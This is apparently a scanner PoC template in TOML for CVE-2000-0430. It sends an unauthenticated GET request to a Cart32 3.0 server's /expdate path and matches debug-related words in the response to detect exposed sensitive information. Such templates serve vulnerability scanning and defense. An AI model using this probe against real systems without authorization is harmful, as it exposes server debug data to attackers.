[info]
author = "ave"
description = "Cart32 3.0 存在信息泄露漏洞，远程攻击者通过在 URL 后附加 /expdate 路径，无需认证即可获取敏感调试信息。"
id = "POC-AVE-2000-0353"
name = "Cart32 3.0 expdate 管理信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-0353"]
vuln_id = [
    "CVE-2000-0430",
    "AVE-2000-0353",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/expdate"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Debug",
    "expdate",
    "Cart32",
]
